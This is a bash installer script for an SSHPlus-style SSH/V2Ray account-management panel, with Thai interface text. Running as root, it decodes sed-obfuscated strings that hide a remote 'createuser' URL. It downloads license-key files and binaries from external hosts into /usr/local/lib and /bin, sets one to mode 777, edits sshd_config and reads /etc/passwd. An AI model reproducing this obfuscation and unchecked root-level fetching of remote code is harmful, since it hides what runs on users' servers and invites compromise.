#!/bin/bash
clear
[[ "$(whoami)" != "root" ]] && {
echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33mvoc√™ precisa executar como root\033[0m"
rm $HOME/Plusx > /dev/null 2>&1; exit 0
}
if [[ -e //usr/bin/neofetch ]]; then
_lnk=$(echo '35434521s2511354c244354r34535432i235435p235435t2425435.l3243643543411212o2534l23453543121o63846431346394u3254348436436c534134541h01543.2543543c25123453513o254125134m0035435354354'|sed -e 's/[^a-z.]//ig');  _Ink=$(echo '/3√óu3#s87r/l32o4√óc1a√ól1/83√ól24√ói0b√ó'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3√óu3#s√ó87r/83√ól2√ó4√ói0b√ó'|sed -e 's/[^a-z/]//ig'); _2nk=$(echo '896893h8578978t786387tp3789s7836:/7863/78678875s78678cri78638787287pt.lo782872l78287278287o782782u78287ch875782.782782com/c782782r782782e82782at82782e782782us782782er'|sed -e 's/[^a-z./:]//ig'); _3nk=$(echo 'F34533U35443934L654313464L3243434S343543443P354687434E35434543E28454354D343434544'|sed -e 's/[^A-Z/]//ig')
cd $HOME
fun_bar () {
  comando[0]="$1"
  comando[1]="$2"
  local status_msg="‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏° ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏£‡∏≠..."
  local sigint_count=0
  local total_blocks=18

  # ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏à‡∏±‡∏ö Ctrl+C
  handle_sigint() {
    ((sigint_count++))
    if [ "$sigint_count" -eq 1 ]; then
      # ‡∏Å‡∏î‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏£‡∏Å ‡πÅ‡∏™‡∏î‡∏á‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞
      printf "\n\033[1;33m>> $status_msg\033[0m\n"
    else
      # ‡∏Å‡∏î‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≠‡∏á ‡∏≠‡∏≠‡∏Å‡∏à‡∏£‡∏¥‡∏á
      printf "\n\033[1;31m>> ‡∏¢‡∏Å‡πÄ‡∏•‡∏¥‡∏Å‡πÇ‡∏î‡∏¢‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ!\033[0m\n"
      tput cnorm
      exit 130
    fi
  }

  trap 'handle_sigint' SIGINT

  (
    [[ -e $HOME/fim ]] && rm $HOME/fim
    ${comando[0]} -y > /dev/null 2>&1
    ${comando[1]} -y > /dev/null 2>&1
    touch $HOME/fim
  ) > /dev/null 2>&1 &

  pid=$!
  tput civis
  echo -ne "  \033[1;33m‡πÇ‡∏õ‡∏£‡∏î‡∏£‡∏≠‡∏™‡∏±‡∏Å‡∏Ñ‡∏£‡∏π‡πà...\033[1;37m-\033[1;33m["

  # ‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£‡πÄ‡∏Å‡πá‡∏ö‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ö‡∏•‡πá‡∏≠‡∏Å‡∏ó‡∏µ‡πà‡πÅ‡∏™‡∏î‡∏á
  local i=0

  while true; do
    # ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡πÄ‡∏õ‡∏≠‡∏£‡πå‡πÄ‡∏ã‡πá‡∏ô‡∏ï‡πå‡πÅ‡∏ö‡∏ö‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ï‡∏≤‡∏°‡∏ö‡∏•‡πá‡∏≠‡∏Å‡∏ó‡∏µ‡πà‡πÅ‡∏™‡∏î‡∏á
    percent=$(( i * 100 / total_blocks ))

    # ‡∏û‡∏¥‡∏°‡∏û‡πå‡∏ö‡∏•‡πá‡∏≠‡∏Å‡∏™‡∏µ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ß‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏ï‡∏±‡∏ß‡∏û‡∏£‡πâ‡∏≠‡∏° lolcat
    echo -ne "\033[1;32m‚ñà" | lolcat

    ((i++))
    # ‡∏û‡∏±‡∏Å 0.1 ‡∏ß‡∏¥ ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÄ‡∏î‡∏¥‡∏°
    sleep 0.1s

    # ‡∏ñ‡πâ‡∏≤‡πÄ‡∏à‡∏≠‡πÑ‡∏ü‡∏•‡πå fim ‡πÅ‡∏õ‡∏•‡∏ß‡πà‡∏≤‡πÄ‡∏™‡∏£‡πá‡∏à
    if [[ -e $HOME/fim ]]; then
      rm $HOME/fim
      break
    fi

    # ‡∏ñ‡πâ‡∏≤‡πÅ‡∏™‡∏î‡∏á‡∏Ñ‡∏£‡∏ö‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ö‡∏•‡πá‡∏≠‡∏Å‡πÅ‡∏•‡πâ‡∏ß ‡πÉ‡∏´‡πâ‡∏•‡∏ö‡∏≠‡∏≠‡∏Å‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ß‡∏ô‡πÉ‡∏´‡∏°‡πà (‡∏ó‡∏≥‡πÉ‡∏´‡πâ progress bar ‡∏ß‡∏¥‡πà‡∏á‡∏ß‡∏ô)
    if (( i >= total_blocks )); then
      # ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏£‡∏¥‡πà‡∏°‡πÅ‡∏™‡∏î‡∏á‡πÉ‡∏´‡∏°‡πà (‡πÅ‡∏ö‡∏ö‡∏ß‡∏ô‡∏•‡∏π‡∏õ)
      tput cuu1
      tput dl1
      echo -ne "  \033[1;33m‡πÇ‡∏õ‡∏£‡∏î‡∏£‡∏≠‡∏™‡∏±‡∏Å‡∏Ñ‡∏£‡∏π‡πà... \033[1;37m- \033[1;33m["
      i=0
    fi
  done

  echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
  tput cnorm

  # ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå trap ‡∏ï‡∏≠‡∏ô‡∏à‡∏ö
  trap - SIGINT
}
function verif_key () {
krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
[[ ! -e "$_Ink/list" ]] && {
echo -e "\n\033[1;31m‡∏£‡∏´‡∏±‡∏™‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á!\033[0m"
rm -rf $HOME/Plusx > /dev/null 2>&1
sleep 1
clear; exit 1
}
}
function verif_key2 () {
krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/news > /dev/null 2>&1
[[ ! -e "$_Ink/news" ]] && {
echo -e "\n\033[1;31m‡∏£‡∏´‡∏±‡∏™‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á!\033[0m"
rm -rf $HOME/Plusx > /dev/null 2>&1
sleep 1
clear; exit 1
}
}
system=$(cat /etc/issue.net)
date=$(date '+%Y-%m-%d <> %H:%M:%S')
echo -e "\033[1;37m $system                          $date"
echo ""
echo "       ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÑ‚ñë‚ñë‚ñë‚ñë‚ñÄ‚ñÑ‚ñë‚ñÑ‚ñÄ"|lolcat
echo "       ‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñà‚ñë‚ñí‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÄ‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñÄ‚ñë‚ñÄ‚ñÄ‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë"|lolcat
echo "       ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñë‚ñÑ‚ñÄ‚ñí‚ñÄ‚ñÑ"|lolcat
echo "                                         ùôéùòæùôçùôÑùôãùôè"
echo ""
echo -e "             \033[1;31m      ‡∏¢‡∏¥‡∏ô‡∏î‡∏µ‡∏ï‡πâ‡∏≠‡∏ô‡∏£‡∏±‡∏ö‡∏™‡∏π‡πà‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ô‡∏µ‡πâ!\033[0m"
echo ""
echo -e "\033[1;31m‚Ä¢ \033[1;33mUBUNTU 16 , 18 , 20 ,\033[0m"
echo -e "\033[1;31m‚Ä¢ \033[1;33mDEBIAN 9 , 10 , 11\033[0m"
echo -e "\033[1;31m‚Ä¢ \033[1;33m‡πÅ‡∏ô‡∏∞‡∏ô‡∏≥ UBUNTU 18 x64 ‡∏î‡∏µ‡∏ó‡∏µ‡πà‡∏™‡∏∏‡∏î‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö ‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á‡∏™‡∏Ñ‡∏£‡∏¥‡∏ö‡∏ï‡πå\033[0m"
echo -e "\033[1;31m‚Ä¢ \033[1;33m‡πÅ‡∏ô‡∏∞‡∏ô‡∏≥ UBUNTU 18 x64 ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö (V2RAY) ‡∏£‡∏∞‡∏ö‡∏ö‡∏≠‡∏∑‡πà‡∏ô‡πÜ‡∏≠‡∏≤‡∏à‡∏à‡∏∞‡πÑ‡∏°‡πà‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì\033[0m"
echo ""
echo -e "\033[1;31m‚Ä¢ \033[1;33m‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ô‡∏µ‡πâ‡∏ü‡∏£‡∏µ  (‡∏´‡πâ‡∏≤‡∏°‡∏ô‡∏≥‡πÑ‡∏õ‡∏´‡∏≤‡πÄ‡∏á‡∏¥‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡∏ï‡∏±‡∏ß‡∏ô‡∏∞‡πÑ‡∏≠‡πâ‡∏™‡∏±‡∏™)\033[0m"
echo -e "\033[1;33m‚Ä¢ \033[1;33m‡∏ó‡∏∏‡∏ÅCode‡πÉ‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡πÉ‡∏ô‡πÑ‡∏î‡πâ‡∏°‡∏≤‡∏à‡∏≤‡∏Å (Github) ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î!!\033[0m"
echo -e "\033[1;31m‚Ä¢ \033[1;33m‡πÉ‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ô‡∏µ‡πâ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡∏ï‡∏±‡∏ß‡∏ú‡∏°‡∏ä‡∏≠‡∏ö ‡πÅ‡∏•‡∏∞‡πÅ‡∏õ‡∏•‡∏†‡∏≤‡∏©‡∏≤(‡∏ó‡πà‡∏≤‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÅ‡∏õ‡∏•‡πÑ‡∏î‡πâ)\033[0m"
echo -e "\033[1;31m‚Ä¢ \033[1;33m‡πÉ‡∏Ñ‡∏£‡∏≠‡∏¢‡∏≤‡∏Å‡∏ó‡∏≥‡πÇ‡∏õ‡∏£‡πÄ‡∏à‡∏Ñ‡πÄ‡∏≠‡∏á‡πÇ‡∏õ‡∏£‡πÄ‡∏à‡∏ÑSSHPLUS‡∏´‡∏≤‡πÄ‡∏≠‡∏≤‡πÉ‡∏ôGithub‡πÄ‡∏¢‡∏≠‡∏∞‡πÅ‡∏¢‡∏∞\033[0m"
echo ""
echo -e "\033[1;32m‚Ä¢ \033[1;32mWELCOME! \033[1;33m‡∏Ç‡∏≠‡πÉ‡∏´‡πâ‡∏™‡∏ô‡∏∏‡∏Å‡∏Å‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö\033[0m"
echo -e "\033[1;33m  ‡∏ü‡∏±‡∏á‡∏ä‡∏±‡πà‡∏ô‡∏ö‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏≠‡∏≤‡∏à‡∏à‡∏∞‡∏ö‡∏±‡∏Ñ‡∏≠‡∏¢‡∏π‡πà‡πÄ‡∏î‡∏µ‡πã‡∏¢‡∏ß‡∏Ñ‡πà‡∏≠‡∏¢‡πÄ‡πÄ‡∏Å‡πâ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ß‡πà‡∏≤‡∏á5555\033[0m"
echo ""
echo -e "\033[1;31m‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó[\033[1;33m ‚Ä¢ \033[1;32mEDIT BY GUNX\033[1;33m ‚Ä¢\033[1;31m ]‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó‚â†√ó\033[0m"
echo ""
#-----------------------------------------------------------------------------------------------------------------
echo -ne "\033[1;36m‡∏¢‡∏∑‡πà‡∏ô‡∏¢‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á[N/S]: \033[1;37m"; read x
[[ $x = @(n|N) ]] && exit
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1
echo -e "\n\033[1;36mCheck Key A... \033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/LiLGun-X/HYPER-X-SCRIPT/main/INSTALL/list > /dev/null 2>&1; verif_key
echo -e "\n\033[1;36mCheck Key B... \033[1;37m 59423:85432\033[0m" ; rm $_Ink/news > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/LiLGun-X/HYPER-X-SCRIPT/main/SYSTEM/news > /dev/null 2>&1; verif_key2
sleep 1.5s
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://kguza.net/sshplus-vip/Install/versao > /dev/null 2>&1
cd /bin/ > /dev/null 2>&1
rm v2m > /dev/null 2>&1
wget https://raw.githubusercontent.com/LiLGun-X/HYPER-X-SCRIPT/main/MODULOS/v2m > /dev/null 2>&1
chmod 777 v2m > /dev/null 2>&1
#-----------------------------------------------------------------------------------------------------------------
echo -e "\n\033[1;32m‡∏Ñ‡∏µ‡∏¢‡πå‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/userlist.txt" ]] && {
    clear
system=$(cat /etc/issue.net)
date=$(date '+%Y-%m-%d <> %H:%M:%S')
echo -e "\033[1;37m $system                          $date"
echo ""
echo "       ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÑ‚ñë‚ñë‚ñë‚ñë‚ñÄ‚ñÑ‚ñë‚ñÑ‚ñÄ"|lolcat
echo "       ‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñà‚ñë‚ñí‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÄ‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñà‚ñë‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñÄ‚ñë‚ñÄ‚ñÄ‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë"|lolcat
echo "       ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñë‚ñí‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñë‚ñí‚ñà‚ñë‚ñí‚ñà‚ñë‚ñë‚ñë‚ñë‚ñÑ‚ñÄ‚ñí‚ñÄ‚ñÑ"|lolcat
echo "                                         ùôéùòæùôçùôÑùôãùôè"
    echo -e "\n\033[0;34m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[0m"
    echo ""
	echo -e "                 \033[1;33m‚Ä¢ \033[1;31m‡∏Ñ‡∏≥‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô! \033[1;33m‚Ä¢ \033[0m"
	echo ""
    echo -e "\033[1;33m‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ \033[1;32m(userlist.txt) \033[1;33m‡∏Ñ‡∏∑‡∏≠" 
    echo -e "‡∏°‡∏µ‡πÅ‡∏•‡πâ‡∏ß! ‡∏Ñ‡∏∏‡∏ì‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô‡∏ô‡∏µ‡πâ ‡πÉ‡∏ä‡πà‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà?"
	echo -e "‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô? ‡∏´‡∏£‡∏∑‡∏≠‡∏Ñ‡∏∏‡∏ì‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£"
    echo -e "‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡∏°‡πà?\033[0m"
	echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33m‡πÉ‡∏ä‡πâ‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô‡∏ô‡∏µ‡πâ\033[0m"
	echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33m‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡∏°‡πà\033[0m"
	echo -e "\n\033[0;34m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[0m"
    echo ""
	tput setaf 2 ; tput bold ; read -p "‡πÄ‡∏•‡∏∑‡∏≠‡∏Å ?: " -e -i 1 optiondb ; tput sgr0
} || {
	awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/userlist.txt
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/userlist.txt
clear
system=$(cat /etc/issue.net)
date=$(date '+%Y-%m-%d <> %H:%M:%S')
echo -e "\033[1;37m $system                          $date"
